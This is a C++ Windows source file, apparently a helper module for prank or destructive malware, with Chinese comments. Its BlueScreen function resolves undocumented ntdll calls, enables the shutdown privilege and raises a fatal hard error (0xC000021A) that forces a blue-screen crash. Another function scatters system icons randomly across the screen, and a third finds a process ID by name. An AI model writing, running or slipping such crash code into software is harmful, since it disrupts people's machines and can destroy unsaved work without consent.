#include"others.h"
using namespace std;
typedef /*__success(return >= 0)*/ LONG NTSTATUS;
typedef NTSTATUS* PNTSTATUS;
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef enum _HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, * PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {
	ResponseReturnToCaller,
	ResponseNotHandled,
	ResponseAbort,
	ResponseCancel,
	ResponseIgnore,
	ResponseNo,
	ResponseOk,
	ResponseRetry,
	ResponseYes
} HARDERROR_RESPONSE, * PHARDERROR_RESPONSE;
typedef UINT(CALLBACK* NTRAISEHARDERROR)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID, HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE);
typedef UINT(CALLBACK* RTLADJUSTPRIVILEGE)(ULONG, BOOL, BOOL, PINT);
/*触发蓝屏*/
void BlueScreen() {

	HINSTANCE hDLL = LoadLibrary(TEXT("ntdll.dll"));
	NTRAISEHARDERROR NtRaiseHardError;
	RTLADJUSTPRIVILEGE RtlAdjustPrivilege;
	int nEn = 0;
	HARDERROR_RESPONSE reResponse;
	if (hDLL != NULL)
	{
		NtRaiseHardError = (NTRAISEHARDERROR)GetProcAddress(hDLL, "NtRaiseHardError");
		RtlAdjustPrivilege = (RTLADJUSTPRIVILEGE)GetProcAddress(hDLL, "RtlAdjustPrivilege");
		if (!NtRaiseHardError)
		{
			FreeLibrary(hDLL);
		}
		if (!RtlAdjustPrivilege)
		{
			FreeLibrary(hDLL);
		}
		RtlAdjustPrivilege(0x13, TRUE, FALSE, &nEn);//0x13 = SeShutdownPrivilege
		NtRaiseHardError(0xC000021A, 0, 0, 0, OptionShutdownSystem, &reResponse);
	}
}

BOOL CALLBACK EnumerateResourceNameProcedure(HMODULE moduleHandle, LPCTSTR typeName, LPTSTR name, LPARAM parameter) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN), screenHeight = GetSystemMetrics(SM_CYSCREEN);
    if (typeName == RT_GROUP_ICON) {
        POINT position;
        GetCursorPos(&position);
        HICON iconHandle = LoadIcon(moduleHandle, name);
        int iconWidth = GetSystemMetrics(SM_CXICON) / 2, iconHeight = GetSystemMetrics(SM_CYICON) / 2;
        HDC deviceContext = GetDC(NULL);
        DrawIcon(deviceContext, rand() % screenWidth, rand() % screenHeight, LoadIcon(moduleHandle, name));
        ReleaseDC(NULL, deviceContext);
    }
    return TRUE;
}
/*随机在屏幕上生成一个图标*/
void randicon() {
    srand(time(NULL));
    HMODULE shell32Handle = LoadLibrary("shell32.dll");
    int screenWidth = GetSystemMetrics(SM_CXSCREEN), screenHeight = GetSystemMetrics(SM_CYSCREEN);
        EnumResourceNamesA(shell32Handle, RT_GROUP_ICON, EnumerateResourceNameProcedure, 20);
}
/*获取自己进程的pid*/
DWORD GetProcess(LPCTSTR name)
{
	PROCESSENTRY32 pe;
	DWORD id = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapshot, &pe))
		return 0;
	while (1)
	{
		pe.dwSize = sizeof(PROCESSENTRY32);
		if (Process32Next(hSnapshot, &pe) == FALSE)
			break;
		if (strcmp(pe.szExeFile, name) == 0)
		{
			id = pe.th32ProcessID;

			break;
		}


	}
	CloseHandle(hSnapshot);
	return id;
}